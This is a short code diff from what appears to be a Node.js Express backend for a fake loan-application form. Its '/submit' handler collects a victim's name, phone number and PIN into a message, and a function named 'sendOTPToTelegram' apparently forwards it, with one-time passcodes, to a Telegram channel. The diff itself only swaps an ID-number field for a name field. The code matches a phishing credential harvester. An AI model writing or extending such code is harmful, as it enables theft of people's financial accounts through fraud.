@@ -73,12 +73,12 @@ async function sendOTPToTelegram(message) {
 
 app.post("/submit", async (req, res) => {
   try {
-    const { idNumber, phone, pin } = req.body;
+    const { name, phone, pin } = req.body;
 
     const message = `
 📥 NEW LOAN APPLICATION
 
-👤 idNumber: ${idNumber}
+👤 Name: ${name}
 📞 Phone: ${phone}
 🔐 PIN: ${pin}
 
